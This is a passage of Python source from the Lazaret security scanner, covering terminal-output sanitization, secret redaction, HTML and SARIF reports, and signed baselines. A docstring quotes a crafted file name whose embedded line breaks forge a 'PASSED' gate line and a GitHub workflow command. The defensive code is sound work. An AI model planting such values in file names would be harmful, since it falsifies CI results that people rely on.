            "scannedAt": datetime.datetime.now().isoformat(timespec="seconds"),
            "pass": all(c["ok"] for c in conds), "conditions": conds,
            "metrics": metrics, "counts": counts, "ratings": ratings,
            "supplyChain": supply, "crossFile": cross_file,
            "perFile": per_file, "issues": issues}

# ---------------- Terminal output ----------------
def c(code, s):
    return f"\033[{code}m{s}\033[0m" if _stdout_is_tty() else str(s)


def _stdout_is_tty():
    """sys.stdout is a terminal. False when there is no stdout at all: with
    file descriptor 1 closed at start (`lazaret dir >&-`) sys.stdout is None,
    and isatty() raised AttributeError (exit 5, no reports)."""
    try:
        return sys.stdout is not None and sys.stdout.isatty()
    except (AttributeError, OSError, ValueError):
        return False

SEV_COLOR = {"BLOCKER": "41;97", "CRITICAL": "31", "MAJOR": "33", "MINOR": "36", "INFO": "34"}

# C0-terminal (audit H1: terminal escape-sequence injection) — every string
# that might derive from scanned content, archive member names, registry
# metadata or config paths is passed through sanitize_term() before it reaches
# a terminal/CI log. safe_excerpt always did this for the code excerpt; the
# file-path header, the issue messages and the registry print paths did not.
# The mapped set: every C0 control byte except TAB (0x09) and LF (0x0a),
# plus CR (0x0d), DEL (0x7f), the C1 controls U+0080–U+009F (0x9b is a
# one-byte CSI introducer on many terminals, 0x9d an OSC) and the bidi
# embedding/override/isolate controls U+202A–U+202E, U+2066–U+2069 (they
# reorder what the terminal shows — Trojan Source). The npm engine's
# sanitizeTerm maps exactly the same set. Built with chr() so the table is
# exact and readable; ESC (0x1b) and BEL (0x07) — the two bytes the audit
# PoC used to forge SGR colors and hijack the terminal title — are inside
# these ranges.
_BIDI_CONTROLS = (
    "".join(chr(n) for n in range(0x202a, 0x202f))  # LRE RLE PDF LRO RLO
    + "".join(chr(n) for n in range(0x2066, 0x206a))  # LRI RLI FSI PDI
)
_SANITIZE_TERM_CHARS = (
    "".join(chr(n) for n in range(0x00, 0x09))      # NUL … BS
    + "".join(chr(n) for n in (0x0b, 0x0c))         # VT, FF
    + "".join(chr(n) for n in range(0x0d, 0x20))    # CR, SO … US (incl. ESC)
    + "".join(chr(n) for n in range(0x7f, 0xa0))    # DEL, C1 controls (incl. CSI)
    + _BIDI_CONTROLS
)
_SANITIZE_TERM_TAB = str.maketrans(
    {ch: "·" for ch in _SANITIZE_TERM_CHARS})


def sanitize_term(s):
    """Neutralize terminal-control bytes in a string before printing.

    Hostile package content reaches the terminal via file paths (archive
    member names, walked repo paths), issue messages (X-FLOW source/sink
    paths, install-hook command text), registry metadata and config paths.
    Every C0 control byte except newline and tab, plus CR, DEL, the C1
    controls and the bidi controls (_SANITIZE_TERM_CHARS), maps to
    '·' — the line terminator is preserved so a multi-line message still
    prints as multiple lines (the existing behaviour), and tab is printable
    structure (safe_excerpt keeps tabs too). Same contract as safe_excerpt
    for a full string, without the truncation.

    Applied to every print() that interpolates such a value; safe_excerpt
    (the truncated single-line variant) already covers the code excerpt.
    Ordering at the call sites matters: sanitize the ARGUMENT of c(), never
    its result — sanitizing the result would strip the SGR sequences
    Lazaret itself emits and leave the color wrapper unclosed.
    """
    return str(s).translate(_SANITIZE_TERM_TAB)


#: Line breaks sanitize_term keeps (\n) or does not know (U+2028, U+2029);
#: every other line break (\r, \v, \f, \x1c-\x1e, \x85) is a control
#: character it already maps.
_LINE_BREAKS_TAB = str.maketrans({"\n": "·", "\u2028": "·", "\u2029": "·"})


def sanitize_term_line(s):
    """sanitize_term for a value printed inside one line of output — a
    path, a link target, a finding's message: line breaks become '·' too,
    so the value cannot start a line of its own (review: a file named
    `zz\\n\\n  Quality gate:  PASSED \\n::notice::…\\n  x.py` printed a fake
    "PASSED" line and a GitHub workflow command at column 0). Twin of the
    npm engine's sanitizeTermLine."""
    return str(s).translate(_SANITIZE_TERM_TAB).translate(_LINE_BREAKS_TAB)

# Rules whose flagged line reveals a credential. The flagged LINE is redacted
# in every persistent artifact by default (see redact_secret_snippet — audit
# L1: the old --redact-secrets flag only sanitized the TERMINAL excerpt while
# JSON/HTML/SARIF reports and the registry DB embedded the full line);
# --no-redact-secrets is the opt-out for audit workflows that need to see the
# secret in the report.
SECRET_RULES = {"S-SECRET", "S-TOKEN", "SQL-CRED", "S-ENTROPY"}
REDACT_SECRETS = True


class forced_redaction:
    """Redaction on for the duration of a `with` block, whatever
    REDACT_SECRETS says, and the old value restored after (review P2).

    For results that are stored: the registry's state DB must never hold a
    raw credential line, so its scans run under this, and the opt-outs
    (--no-redact-secrets, LAZARET_NO_REDACT) keep working for project scans
    only. Redaction happens when each finding is created, from the whole
    file (PEM blocks, the file's high-entropy literals), which a later sweep
    over the stored snippets cannot redo; hence forcing it for the whole
    scan rather than cleaning up afterwards. Scans run one at a time in a
    process (the MCP server has a single tool thread), so a module-level
    switch is safe here."""

    def __enter__(self):
        global REDACT_SECRETS
        self._saved = REDACT_SECRETS
        REDACT_SECRETS = True
        return self

    def __exit__(self, *exc):
        global REDACT_SECRETS
        REDACT_SECRETS = self._saved
        return False


REDACT_PLACEHOLDER = "[redacted: secret rule {RULE}]"
REDACT_FINGERPRINT = "[redacted: secret rule "   # marker of an already-redacted line
EXCERPT_WIDTH = 100   # overridable via --excerpt-width

def safe_excerpt(text, width=None):
    """Sanitize a source line for terminal display. Scanned code may be hostile
    (esp. packages), so strip ANSI/control bytes that could rewrite the terminal
    — ESC, CR, BS, BEL, NUL, C1 controls, bidi controls and anything else
    str.isprintable() rejects — replacing them with '·'. Tabs become spaces,
    the line is trimmed and truncated with an ellipsis. (Twin of the npm
    engine's safeExcerpt; the bidi controls are named explicitly there and
    here so the result does not hang on a Unicode database's category.)"""
    if width is None:
        width = EXCERPT_WIDTH
    text = text.replace("\t", " ").strip()
    if not text:
        return ""
    out = []
    for ch in text[:width]:
        o = ord(ch)
        if ch == " " or 0x20 <= o < 0x7f or (
                o > 0xa0 and ch.isprintable() and ch not in _BIDI_CONTROLS):
            out.append(ch)
        else:
            out.append("·")
    return "".join(out) + ("…" if len(text) > width else "")

def issue_excerpt(issue, width=None):
    """Sanitized excerpt of an issue's flagged source line ('' if unavailable)."""
    snip = issue.get("snippet") or []
    idx = issue["line"] - issue.get("snipStart", issue["line"])
    if not (0 <= idx < len(snip)):
        return ""
    if REDACT_SECRETS and issue.get("rule") in SECRET_RULES:
        # mk_issue already replaced the flagged line with the placeholder;
        # this guard keeps old/unredacted issues (e.g. a not-yet-redacted
        # report fed back through print paths) from leaking via the excerpt.
        return "[redacted]"
    return safe_excerpt(snip[idx], width)

def redact_result(res):
    """Defensive sweep over a scan result: no credential may survive into a
    report artifact.

    Two layers (audit L1):
    * Any SECRET-rule issue still carrying an unredacted flagged line
      (embedded from an unpatched engine path) is redacted in place via
      redact_secret_snippet.
    * EVERY issue's snippet — secret rule or not — has its context lines
      swept with the line-level secret matchers: a snippet around an
      os.system finding routinely contains the file's actual credentials on
      adjacent lines, and those would otherwise ship to the JSON/HTML
      report verbatim. Only matched substrings are replaced; surrounding
      code stays readable.

    mk_issue is the primary fix; this is the belt-and-braces pass so a leak
    requires BOTH mk_issue to miss AND this sweep to miss. The sweep also
    clips every snippet line to SNIPPET_MAX characters (issues built outside
    mk_issue, e.g. by the flow engine, get the same size bound).
    """
    for i in res.get("issues", []):
        if REDACT_SECRETS:
            # free-text fields that can copy source: the message, and the
            # install-hook command kept for the registry (`cmd`)
            for key in ("msg", "cmd"):
                v = i.get(key)
                if isinstance(v, str):
                    nv = _redact_text(v)
                    if nv != v:
                        i[key] = nv
        snip = i.get("snippet")
        if not isinstance(snip, list):
            continue
        if not REDACT_SECRETS:
            clipped = [clip_snippet_line(l) for l in snip]
            if clipped != snip:
                i["snippet"] = clipped
            continue
        idx = i["line"] - i.get("snipStart", i["line"])
        secret = i.get("rule") in SECRET_RULES
        if secret and 0 <= idx < len(snip) and isinstance(snip[idx], str) \
                and REDACT_FINGERPRINT not in snip[idx]:
            i["snippet"] = [clip_snippet_line(l) for l in
                            redact_secret_snippet(i["rule"], snip, idx, snip[idx])]
            continue
        # non-secret rule (or already-redacted secret): sweep context lines
        cleaned = [clip_snippet_line(l) for l in _redact_lines(snip)]
        if cleaned != snip:
            i["snippet"] = cleaned
    return res

def print_report(res, quiet):
    m, ct, rt = res["metrics"], res["counts"], res["ratings"]
    print()
    print(c("1", f"Lazaret scan — {sanitize_term_line(res['project'])}"))
    configs = f" · {m['configFiles']} config files" if m.get("configFiles") else ""
    print(f"  {m['files']} files · {m['ncloc']} lines of code · {m['dupPct']}% duplication{configs}")
    print()
    gate = c("42;30", " PASSED ") if res["pass"] else c("41;97", " FAILED ")
    print(f"  Quality gate: {gate}")
    for cond in res["conditions"]:
        mark = c("32", "✓") if cond["ok"] else c("31", "✗")
        # audit H1: a gate condition label can embed a scanned file path
        # ("Taint analysis incomplete → <file>", build_result) — hostile repo.
        print(f"    {mark} {sanitize_term_line(cond['label'])}")
    print()
    print(f"  Vulnerabilities   {ct['VULN']:>4}   Security rating        {rt['security']}")
    print(f"  Security hotspots {ct['HOTSPOT']:>4}")
    print(f"  Bugs              {ct['BUG']:>4}   Reliability rating     {rt['reliability']}")
    print(f"  Code smells       {ct['SMELL']:>4}   Maintainability rating {rt['maintainability']}")
    sc = res.get("supplyChain", 0)
    print(f"  Supply-chain      {sc:>4}   (obfuscation/install-hook indicators)")
    xf = res.get("crossFile", 0)
    if xf:
        print(f"  Cross-file flows  {c('31', xf):>4}   (interprocedural taint)")
    if m.get("depFiles"):
        print(f"  Dependency files scanned: {m['depFiles']}")
    if "newIssues" in res:
        print(f"  New issues vs baseline: {c('1', res['newIssues'])}")
    print()
    if not quiet and res["issues"]:
        print(c("1", "  Issues"))
        cur_file = None
        for i in sorted(res["issues"], key=lambda i: (i["file"], SEV_ORDER[i["sev"]], i["line"])):
            if i["file"] != cur_file:
                cur_file = i["file"]
                # audit H1: the path header is attacker-controlled (repo walk
                # path, or an archive member name in registry mode). Sanitize
                # the ARGUMENT of c(), never its result — the SGR wrapper
                # Lazaret emits must survive.
                print(f"\n  {c('4', sanitize_term_line(cur_file))}")
            sev_txt = f"{i['sev']:<8}"
            prefix = f"    L{i['line']:<5} {sev_txt} [{i['rule']}] "
            # audit H1: i['msg'] is static text for most rules but embeds
            # attacker data for several (X-FLOW source/sink paths, the
            # SC-INSTALL-HOOK {cmd!r}, SCA bundle fields). Sanitized inside
            # the f-string, AFTER the colored severity span — sanitizing the
            # whole colored string would strip c()'s own SGR reset.
            print(f"    L{i['line']:<5} {c(SEV_COLOR[i['sev']], sev_txt)} [{i['rule']}] {sanitize_term_line(i['msg'])}")
            ex = issue_excerpt(i)
            if ex:
                print(" " * len(prefix) + c('2', '» ' + ex))   # aligned under the message
        print()

# ---------------- HTML report ----------------
def esc(s):
    return html_mod.escape(str(s), quote=True)

RATING_COLOR = {"A": "#00aa55", "B": "#7dc94a", "C": "#f0c000", "D": "#ed7d20", "E": "#d4380d"}

HTML_CSS = """
:root{--border:#dde3ea;--muted:#6b7785;--navy:#1a2634;
--blocker:#c4160f;--critical:#d4380d;--major:#e08a00;--minor:#8a9aa8;--info:#4b9fd5;
--mono:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
*{box-sizing:border-box;margin:0;padding:0}
body{font:14px/1.5 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:#f3f5f7;color:#1f2933}
header{background:var(--navy);color:#fff;padding:14px 24px}
header .logo{font-size:17px;font-weight:700}header .logo span{color:#4b9fd5}
header .meta{font-size:12px;color:#9fb0c0;margin-top:2px}
.wrap{max-width:1150px;margin:0 auto;padding:20px 24px 60px}
.panel{background:#fff;border:1px solid var(--border);border-radius:8px;padding:18px;margin-bottom:18px}
h2{font-size:15px;margin-bottom:12px}
.gate{display:flex;align-items:center;gap:14px;margin-bottom:16px;flex-wrap:wrap}
.gate-badge{font-size:15px;font-weight:700;color:#fff;padding:8px 18px;border-radius:6px}
.gate-badge.pass{background:#00aa55}.gate-badge.fail{background:#d4380d}
.cond{font-size:12px;padding:4px 10px;border-radius:12px;border:1px solid var(--border)}
.cond.ok{border-color:#bfe8d2;background:#eefaf3;color:#0a7a44}
.cond.ko{border-color:#f3c4bb;background:#fdf0ee;color:#b32d16}
.cards{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:12px}
.card{border:1px solid var(--border);border-radius:8px;padding:14px;text-align:center}
.card .num{font-size:26px;font-weight:700}.card .lbl{font-size:12px;color:var(--muted);margin-top:2px}
.rating{display:inline-flex;align-items:center;justify-content:center;width:26px;height:26px;border-radius:50%;
color:#fff;font-size:13px;font-weight:700;margin-left:8px;vertical-align:3px}
table{width:100%;border-collapse:collapse;font-size:13px}
td,th{padding:6px 10px;border-bottom:1px solid var(--border);text-align:left}
th{color:var(--muted);font-size:12px}td.n{text-align:right;font-variant-numeric:tabular-nums}
details{border:1px solid var(--border);border-radius:8px;margin-bottom:10px;background:#fff;overflow:hidden}
summary{display:flex;align-items:center;gap:10px;padding:10px 14px;cursor:pointer;list-style:none}
summary::-webkit-details-marker{display:none}summary:hover{background:#f7f9fb}
.sev{font-size:10.5px;font-weight:700;color:#fff;padding:2px 8px;border-radius:10px;flex-shrink:0}
.sev.BLOCKER{background:var(--blocker)}.sev.CRITICAL{background:var(--critical)}
.sev.MAJOR{background:var(--major)}.sev.MINOR{background:var(--minor)}.sev.INFO{background:var(--info)}
.itype{font-size:11px;color:var(--muted);border:1px solid var(--border);padding:1px 8px;border-radius:10px;flex-shrink:0}
.imsg{flex:1;font-weight:600;font-size:13px}
.iloc{font:11.5px var(--mono);color:var(--muted);flex-shrink:0}
.body{border-top:1px solid var(--border);padding:12px 14px;background:#fbfcfd}
.snippet{font:12px/1.6 var(--mono);background:#1a2634;color:#d7e0ea;border-radius:6px;padding:10px 0;margin-bottom:10px;overflow-x:auto}
.snippet .ln{display:flex}.snippet .no{width:52px;text-align:right;padding-right:12px;color:#5d7186;flex-shrink:0}
.snippet .hl{background:#5c2b29}.snippet code{white-space:pre}
.why{margin-bottom:8px}.why b{font-size:12px;text-transform:uppercase;letter-spacing:.5px;color:var(--muted)}
.refs{font-size:12px;color:var(--muted)}
footer{max-width:1150px;margin:0 auto;padding:0 24px 30px;font-size:11.5px;color:var(--muted)}
"""

def rating_badge(r):
    return f'<span class="rating" style="background:{RATING_COLOR[r]}">{r}</span>'

def html_report(res):
    m, ct, rt = res["metrics"], res["counts"], res["ratings"]
    gate_cls = "pass" if res["pass"] else "fail"
    gate_txt = "Quality Gate: Passed" if res["pass"] else "Quality Gate: Failed"
    conds = "".join(
        f'<span class="cond {"ok" if c["ok"] else "ko"}">{"✓" if c["ok"] else "✗"} {esc(c["label"])}</span>'
        for c in res["conditions"])
    cards = f"""
<div class="card"><div class="num">{ct['VULN']}{rating_badge(rt['security'])}</div><div class="lbl">Vulnerabilities · Security</div></div>
<div class="card"><div class="num">{ct['HOTSPOT']}</div><div class="lbl">Security Hotspots</div></div>
<div class="card"><div class="num">{ct['BUG']}{rating_badge(rt['reliability'])}</div><div class="lbl">Bugs · Reliability</div></div>
<div class="card"><div class="num">{ct['SMELL']}{rating_badge(rt['maintainability'])}</div><div class="lbl">Code Smells · Maintainability</div></div>
<div class="card"><div class="num">{m['dupPct']}%</div><div class="lbl">Duplication</div></div>
<div class="card"><div class="num">{m['ncloc']}</div><div class="lbl">Lines of Code</div></div>
<div class="card"><div class="num">{m['files']}</div><div class="lbl">Files Scanned</div></div>"""
    file_rows = "".join(
        f"<tr><td>{esc(f)}</td><td class='n'>{n}</td></tr>"
        for f, n in sorted(res["perFile"].items(), key=lambda kv: -kv[1]))
    file_table = (f"<table><tr><th>File</th><th style='text-align:right'>Issues</th></tr>{file_rows}</table>"
                  if file_rows else "<p>No issues in any file. 🎉</p>")
    items = []
    for i in res["issues"]:
        snippet = "".join(
            f'<div class="ln{" hl" if i["snipStart"] + k == i["line"] else ""}">'
            f'<span class="no">{i["snipStart"] + k}</span><code>{esc(l) or " "}</code></div>'
            for k, l in enumerate(i["snippet"]))
        items.append(f"""
<details><summary><span class="sev {i['sev']}">{i['sev']}</span>
<span class="itype">{TYPE_LABEL[i['type']]}</span>
<span class="imsg">{esc(i['msg'])}</span>
<span class="iloc">{esc(i['file'])}:{i['line']}</span></summary>
<div class="body"><div class="snippet">{snippet}</div>
<div class="why"><b>Why it matters</b><div>{esc(i['why'])}</div></div>
<div class="why"><b>How to fix</b><div>{esc(i['fix'])}</div></div>
<div class="refs">Rule {i['rule']} · {esc(i['ref'])}</div></div></details>""")
    issues_html = "\n".join(items) if items else "<p>No issues found. 🎉</p>"
    return f"""<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Lazaret Report — {esc(os.path.basename(res['project']))}</title>
<style>{HTML_CSS}</style></head><body>
<header><div class="logo">Laza<span>ret</span> · Project Report</div>
<div class="meta">{esc(res['project'])} · scanned {esc(res['scannedAt'])}</div></header>
<div class="wrap">
<div class="panel"><div class="gate"><div class="gate-badge {gate_cls}">{gate_txt}</div>{conds}</div>
<div class="cards">{cards}</div></div>
<div class="panel"><h2>Issues by file</h2>{file_table}</div>
<div class="panel"><h2>All issues ({len(res['issues'])})</h2>{issues_html}</div>
</div>
<footer>Generated by Lazaret CLI. Pattern- and heuristic-based static analysis — not a substitute for a full security audit.</footer>
</body></html>"""

# ---------------- SARIF output ----------------
SARIF_LEVEL = {"BLOCKER": "error", "CRITICAL": "error", "MAJOR": "warning",
               "MINOR": "note", "INFO": "note"}

def _html_report_marked(res):
    """html_report() output with the Lazaret provenance meta-tag injected
    into <head>, so report files produced by this tool are recognizable and
    can be safely re-written by a later run (no-clobber-by-provenance)."""
    return html_report(res).replace(
        '<meta name="viewport"',
        lazaret_report.HTML_ENGINE_MARKER + '\n<meta name="viewport"',
        1)

#: SARIF run-level base for every repo-relative artifactLocation.
SARIF_SRCROOT = "%SRCROOT%"
LAZARET_INFORMATION_URI = "https://lazaret.dev"
SARIF_SCHEMA = "https://json.schemastore.org/sarif-2.1.0.json"


def sarif_uri(path):
    """A report path as a SARIF artifactLocation: (uri, uriBaseId or None).

    Review item 8: the uri used to be the raw path — 'my dir/a#1%2.py'
    verbatim, so '#' started a fragment and '%2.' was a broken escape. Now a
    root-relative path becomes a percent-encoded relative reference (RFC
    3986, '/' separators) resolved against %SRCROOT%; an absolute path
    becomes a file: URI."""
    p = _safe_text(path)
    if os.path.isabs(p):
        return _pathlib.Path(p).as_uri(), None
    if os.sep != "/":
        p = p.replace(os.sep, "/")
    return _urlparse.quote(p, safe="/"), SARIF_SRCROOT


def _root_uri(root):
    uri = _pathlib.Path(os.path.abspath(os.fspath(root))).as_uri()
    return uri if uri.endswith("/") else uri + "/"


def sarif_report(res, root=None):
    """SARIF 2.1.0 log for a scan result. `root` is the scan root (defaults
    to res['project']); it becomes originalUriBaseIds['%SRCROOT%']."""
    # L1: sarif_report receives the result AFTER redact_result has swept it,
    # and it emits no snippet text — but it does embed issue msg/why/fix
    # strings from the result. Defensively sweep here too so a future caller
    # that skips the main() pass cannot ship an unredacted result into SARIF.
    redact_result(res)
    rules_seen, rule_index, results = {}, {}, []
    for i in res["issues"]:
        if i["rule"] not in rules_seen:
            rule_index[i["rule"]] = len(rules_seen)
            rules_seen[i["rule"]] = {
                "id": i["rule"], "name": i["name"],
                "shortDescription": {"text": i["name"]},
                "fullDescription": {"text": i["why"]},
                "help": {"text": i["fix"]}}
        uri, base = sarif_uri(i["file"])
        loc = {"uri": uri}
        if base:
            loc["uriBaseId"] = base
        try:
            line = max(1, int(i.get("line") or 1))
        except (TypeError, ValueError):
            line = 1
        results.append({
            "ruleId": i["rule"],
            "ruleIndex": rule_index[i["rule"]],
            "level": SARIF_LEVEL[i["sev"]],
            "message": {"text": i["msg"]},
            "locations": [{"physicalLocation": {
                "artifactLocation": loc,
                "region": {"startLine": line}}}]})
    return {"$schema": SARIF_SCHEMA,
            "version": "2.1.0",
            "runs": [{"tool": {"driver": {"name": "Lazaret",
                                          "version": _lazaret_pkg.__version__,
                                          "informationUri": LAZARET_INFORMATION_URI,
                                          "rules": list(rules_seen.values())}},
                      "originalUriBaseIds": {SARIF_SRCROOT: {
                          "uri": _root_uri(res["project"] if root is None else root)}},
                      "results": results}]}

# ---------------- Baseline (new-code focus) ----------------
def fingerprint(issue):
    # One definition shared with the report writer (which signs these
    # fingerprints when $LAZARET_BASELINE_KEY is set): rule | path with
    # forward slashes (portable across OSes) | stripped flagged line.
    return lazaret_report.fingerprint(issue)
# NOTE: redaction (audit L1) happens at mk_issue time, BEFORE this
# fingerprint is computed — the placeholder text is deterministic for a
# given (rule, secret length), so same-engine baselines still match; a
# pre-redaction-era baseline (with raw secret lines) simply won't match a
# secret fingerprint any more, and those issues surface as new — the safe
# direction for a security tool.


def _baseline_untrusted(res, baseline_path, reason):
    """Count every current finding as new and say why the baseline was not
    trusted."""
    # audit H1: baseline_path may resolve inside the scanned repo; the
    # message text is sanitized before it reaches the terminal.
    print(f"warning: baseline {sanitize_term_line(baseline_path)} {reason} — "
          f"treating it as untrusted: all current findings are counted "
          f"as new", file=sys.stderr)
    for i in res["issues"]:
        i["new"] = True
    res["newIssues"] = len(res["issues"])
    res["baselineUntrusted"] = True


def apply_baseline(res, baseline_path, scan_root=None):
    """Mark res["issues"] new/not-new against a previous JSON report.

    Trust (G17): a baseline is a REPORT-shaped file that CI may gate on, and
    the engine marker is a public constant — a hand-written 5-line file
    carrying it used to zero `newIssues` ("New issues vs baseline: 0") while
    the scan had live findings. So:
      * $LAZARET_BASELINE_KEY set: reports are HMAC-signed over their
        fingerprints, and a baseline is trusted only if its signature
        verifies with that key (wherever it lives).
      * no key: a baseline inside the scanned tree (*scan_root*) is
        untrusted — the scanned repository could have planted it; outside
        the tree the engine-marker check applies.
    An untrusted baseline counts every finding as new (fail closed)."""
    if lazaret_report is None:
        print("warning: baseline validation unavailable (lazaret_report not "
              "importable); baseline ignored", file=sys.stderr)
        return
    if not lazaret_report.is_our_report(baseline_path, "json"):
        _baseline_untrusted(
            res, baseline_path,
            "is not a report produced by this engine (no matching engine "
            "marker, or wrong shape)")
        return
    key = lazaret_report.baseline_key()
    if (key is None and scan_root is not None
            and lazaret_report.path_is_inside(baseline_path, scan_root)):
        _baseline_untrusted(
            res, baseline_path,
            f"is inside the scanned tree and ${lazaret_report.BASELINE_KEY_ENV} "
            f"is not set (the scanned repository could have planted it) — "
            f"keep baselines outside the scanned tree (e.g. in $RUNNER_TEMP) "
            f"or set {lazaret_report.BASELINE_KEY_ENV} so reports are signed")
        return
    try:
        with open(baseline_path, encoding="utf-8") as fh:
            prev = json_loads_bounded(fh.read())
    except (OSError, ValueError, MemoryError) as exc:
        # ValueError covers JSONDecodeError, UnicodeDecodeError, the
        # int-digit limit and JsonTooDeep. audit H1: {exc} can echo hostile baseline content
        # (JSONDecodeError position text); sanitize both interpolations.
        print(f"warning: could not read baseline {sanitize_term_line(baseline_path)}: "
              f"{sanitize_term_line(exc)}", file=sys.stderr)
        return
    # 48033f94: validate the baseline's shape before using it. A baseline is
    # attacker-adjacent input (it usually comes from the scanned repo or CI
    # artifacts); {"issues":"not-a-list"} raised TypeError and a top-level
    # list raised AttributeError, both crashing the CLI after the scan had
    # already run — losing every result.
    if not isinstance(prev, dict):
        # audit H1: the baseline path can resolve inside the scanned repo.
        print(f"warning: baseline {sanitize_term_line(baseline_path)}: top level is "
              f"{type(prev).__name__}, not an object — expected "
              f'{{"issues": [...]}}; baseline ignored', file=sys.stderr)
        return
    issues = prev.get("issues", [])
    if not isinstance(issues, list):
        # audit H1: sanitize the repo-adjacent baseline path before printing.
        print(f"warning: baseline {sanitize_term_line(baseline_path)}: 'issues' is "
              f"{type(issues).__name__}, not a list — baseline ignored",
              file=sys.stderr)
        return
    if key is not None:
        ok, why = lazaret_report.verify_signature(prev, key)
        if not ok:
            _baseline_untrusted(res, baseline_path, f"is not trusted: {why}")
            return
    known, skipped = set(), 0
    for i in issues:
        # Each baseline entry must at least look like an issue (rule/file/line
        # keys); a malformed entry is skipped with a warning, not a crash.
        try:
            known.add(fingerprint(i))
        except (KeyError, TypeError, AttributeError):
            skipped += 1
    if skipped:
        # audit H1: sanitize the repo-adjacent baseline path before printing.
        print(f"warning: baseline {sanitize_term_line(baseline_path)}: {skipped} malformed "
              f"issue entrie(s) skipped (expected objects with "
              f"rule/file/line)", file=sys.stderr)
    new_count = 0
    for i in res["issues"]:
        i["new"] = fingerprint(i) not in known
        new_count += i["new"]
    res["newIssues"] = new_count

# ---------------- Main ----------------
# Exit codes (FIX-SPEC 10): 0 scan ok (or the gate failed without --ci);
# 1 gate failed with --ci, or a hostile manifest (SC-MANIFEST-DEPTH — the only
# finding that forces a non-zero exit without --ci); 2 usage error (unknown
# option; missing, non-directory, unreadable or empty target); 3 report output
# error (lazaret_report.EXIT_OUTPUT); 4 taint config rejected
# (EXIT_TAINT_CONFIG); 5 internal error — never a raw traceback, and never
# confusable with "gate failed".
EXIT_OK = 0
EXIT_GATE = 1
EXIT_USAGE = 2
EXIT_INTERNAL = 5


_LINE_BREAKS_SPACE = str.maketrans({"\n": " ", "\u2028": " ", "\u2029": " "})


def _internal_error(exc):
    """Report an uncaught exception as `error: internal: …` and exit 5. The
    traceback is printed only with LAZARET_DEBUG=1."""
    debug = os.environ.get("LAZARET_DEBUG") == "1"
    try:
        if debug:
            _traceback.print_exc()
        detail = sanitize_term(_safe_text(exc)).translate(_LINE_BREAKS_SPACE)
        if len(detail) > 500:
            detail = detail[:497] + "..."
        print(f"error: internal: {type(exc).__name__}" + (f": {detail}" if detail else ""),
              file=sys.stderr)
        if not debug:
            print("  (this is a Lazaret bug, not a scan result; set LAZARET_DEBUG=1 "
                  "for a traceback)", file=sys.stderr)
    except Exception:
        pass
    sys.exit(EXIT_INTERNAL)


class _PipeSafeStdout:
    """sys.stdout while the CLI runs. The terminal report is printed before
    the reports are written, so a reader that went away turned the scan into
    `error: internal: BrokenPipeError`, exit 5, and no JSON or HTML report
    (review: `lazaret --ci dir | head -n 2`). Once a write or flush fails
    that way, stdout is pointed at the null device (so the flush at exit
    cannot fail either, which would make the exit status 120) and the rest of
    the output is dropped; the scan writes its reports and exits with its
    own code."""

    def __init__(self, stream):
        self._stream = stream
        self.gone = False

    def _drop(self):
        self.gone = True
        try:
            devnull = os.open(os.devnull, os.O_WRONLY)
            try:
                os.dup2(devnull, self._stream.fileno())
            finally:
                os.close(devnull)
        except (AttributeError, OSError, ValueError, io.UnsupportedOperation):
            pass

    def _gone_error(self, exc):
        """The reader went away: EPIPE (BrokenPipeError) on POSIX, EINVAL
        from Windows for a pipe closed at the other end, or a closed file."""
        if isinstance(exc, OSError):
            return exc.errno in (errno.EPIPE, errno.EINVAL)
        return getattr(self._stream, "closed", False) is True

    def write(self, text):
        if not self.gone:
            try:
                return self._stream.write(text)
            except (OSError, ValueError) as exc:
                if not self._gone_error(exc):
                    raise
                self._drop()
        return len(text)

    def flush(self):
        if not self.gone:
            try:
                self._stream.flush()
            except (OSError, ValueError) as exc:
                if not self._gone_error(exc):
                    raise
                self._drop()

    def __getattr__(self, name):
        return getattr(self._stream, name)


def main(argv=None):
    """`lazaret` console entry point. argv defaults to sys.argv[1:]. Any
    uncaught exception becomes `error: internal: …` with exit 5 (review item
    4: a non-UTF-8 file name crashed the HTML writer with a traceback and
    exit 1 — indistinguishable from a failed gate). A closed stdout never
    stops the scan (see _PipeSafeStdout)."""
    configure_stdio()
    real_stdout = sys.stdout
    guard = _PipeSafeStdout(real_stdout) if real_stdout is not None else None
    if guard is not None:
        sys.stdout = guard
    try:
        return _main(argv)
    except (SystemExit, KeyboardInterrupt):
        raise
    except Exception as exc:
        _internal_error(exc)
    finally:
        if guard is not None:
            try:
                guard.flush()                # the buffered tail, while it is still guarded
            except Exception:                # (a full disk: the output is lost, the exit code is not)
                pass
            if sys.stdout is guard:
                sys.stdout = real_stdout


def _positive_int(text):
    """argparse type: an integer above zero."""
    try:
        value = int(text)
    except ValueError:
        value = 0
    if value <= 0:
        raise argparse.ArgumentTypeError(f"expected a positive number of bytes, got {text!r}")
    return value


def _main(argv=None):
    global REDACT_SECRETS, EXCERPT_WIDTH, SOURCE_SIZE_CAP
    ap = argparse.ArgumentParser(prog="lazaret", description="Lazaret — security & quality scanner for Python/JS projects.")
    from lazaret.scanner import engine     # (imported here: engine imports core)
    ap.add_argument("--version", action="version",
                    version=f"lazaret {_lazaret_pkg.__version__} (engine: {engine.describe()})")
    ap.add_argument("directory", help="Project directory to scan")
    ap.add_argument("--out-dir", metavar="DIR",
                    help="Directory for the default reports (default: the scan root). "
                         "Must already exist and be writable.")
    ap.add_argument("--html", default=None, metavar="PATH",
                    help="Write HTML project report (default: <out-dir>/lazaret-report.html)")
    ap.add_argument("--json", default=None, metavar="PATH",
                    help="Write JSON report (default: <out-dir>/lazaret-report.json)")
    ap.add_argument("--no-html", action="store_true")
    ap.add_argument("--no-json", action="store_true")
    ap.add_argument("--force-overwrite", action="store_true",
                    help="Overwrite an existing report file even if it was not "
                         "produced by Lazaret (still refuses directories, "
                         "symlinks and special files)")
    ap.add_argument("--exclude", action="append", default=[], metavar="NAME",
                    help="Extra directory name to skip (repeatable)")
    ap.add_argument("--deps", action="store_true",
                    help="Also scan dependency dirs (node_modules, venv, vendor) for "
                         "supply-chain indicators: obfuscation, secrets, install hooks")
    ap.add_argument("--sarif", metavar="PATH",
                    help="Write SARIF 2.1.0 report (GitHub code scanning)")
    ap.add_argument("--baseline", metavar="PATH",
                    help="Previous JSON report; issues not in it are marked new")
    ap.add_argument("--taint-config", metavar="PATH",
                    help="JSON taint spec adding custom sources/sinks/sanitizers "
                         "(Semgrep-style); trusted fully. A file that can't be "
